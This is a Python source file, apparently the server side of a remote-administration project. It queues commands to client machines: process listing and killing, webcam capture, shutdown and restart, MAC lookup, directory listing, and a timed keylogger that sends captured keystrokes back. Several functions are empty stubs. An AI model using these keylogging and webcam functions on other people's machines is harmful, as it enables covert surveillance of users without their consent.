from collections import defaultdict
from old_handle import app_process_server
from old_handle import directory_tree_server
from old_handle import keylogger_server
from old_handle import live_screen_server
from old_handle import mac_address_server
from old_handle import registry_server
from old_handle import shutdown_logout_server
from queue import Queue
# import pandas as pd

from time import sleep
BUFSIZ = 4 * 1024

conn_ip_list = [] # list_ip() # Tuple (conn, addr)

auth_dict = defaultdict(lambda: False) # MAIL -> bool
email_ip_dict = {} # MAIL -> IP

def list_ip():
    return [elem[1] for elem in conn_ip_list]

action_dictionary = {}
def __init__():
    for i in conn_ip_list:
        action_dictionary[i[1]] = Queue(maxsize=0)

def list_process(ip_address):
    action_message = lambda conn: (
        conn.sendall(bytes("APP_PRO", "utf8")), # NHO DIEN THEM CAI NAY (TRONG FILE CLIENT.PY)
        app_process_server._list(conn, "PROCESS") 
    )
    action_dictionary[ip_address].put(action_message)


def list_application(ip_address):
    action_message = lambda conn: (
        conn.sendall(bytes("APP_PRO", "utf8")),
        app_process_server._list(conn, "APPLICATION")
    )    
    action_dictionary[ip_address].put(action_message)

def kill_process(ip_address, id):
    action_message = lambda conn: (
        conn.sendall(bytes("APP_PRO", "utf8")),
        app_process_server.send_kill(conn, id)
    )
    action_dictionary[ip_address].put(action_message)

def kill_application(ip_address, id):
    action_message = lambda conn: (
        conn.sendall(bytes("APP_PRO", "utf8")),
        app_process_server.send_kill(conn, id)
    )
    action_dictionary[ip_address].put(action_message)

def capture_webcam(ip_address, time):
    def action_message(conn):
        conn.sendall(b"WEBCAM".ljust(BUFSIZ))
        conn.sendall(str(time).encode().ljust(BUFSIZ))

        # Recv phase
        size_to_recv = int(conn.recv(BUFSIZ).decode('utf8'))
        data_to_recv = b''
        for idx in range(0, size_to_recv, BUFSIZ):
            r = conn.recv(BUFSIZ)
            data_to_recv += r
        data_to_recv = data_to_recv[:size_to_recv] # Remove additional bytes
        open("./tmp.avi", "wb").write(data_to_recv)
    action_dictionary[ip_address].put(action_message)
    pass

def capture_screen(ip_address):
    pass

def shut_down(ip_address):
    action_message = lambda conn: (
       # conn.sendall(bytes("SHUTDOWN", "utf8")),
        shutdown_logout_server.shutdown(conn)
    )
    action_dictionary[ip_address].put(action_message)

def logout(ip_address):
    action_message = lambda conn: (
        shutdown_logout_server.logout(conn)
    )
    action_dictionary[ip_address].put(action_message)

def restart(ip_address):
    action_message = lambda conn: (
        shutdown_logout_server.restart(conn)
    )
    action_dictionary[ip_address].put(action_message)

def mac_address(ip_address):
    action_message = lambda conn: (
        conn.sendall(bytes("MAC", "utf8")),
        mac_address_server.mac_address(conn)
    )
    action_dictionary[ip_address].put(action_message)

def keylog(ip_address, time):
    def action_message(conn):
        conn.sendall(bytes("KEYLOG", "utf8"))
        conn.sendall(b'HOOK'.ljust(BUFSIZ))
        sleep(time)
        conn.sendall(b'HOOK'.ljust(BUFSIZ))
        conn.sendall(b'PRINT'.ljust(BUFSIZ))
        data = conn.recv(BUFSIZ)
        print(data) # Debug
    action_dictionary[ip_address].put(action_message)

def registry_list(ip_address, path_to_folder):
    pass

def registry_update(ip_address, absolute_path, value):
    pass

def dir_list(ip_address, path_to_folder):
    action_message = lambda conn: directory_tree_server.dir_list(conn, path_to_folder)
    action_dictionary[ip_address].put(action_message)

def dir_copy(ip_address, src_path, dst_path):
    pass
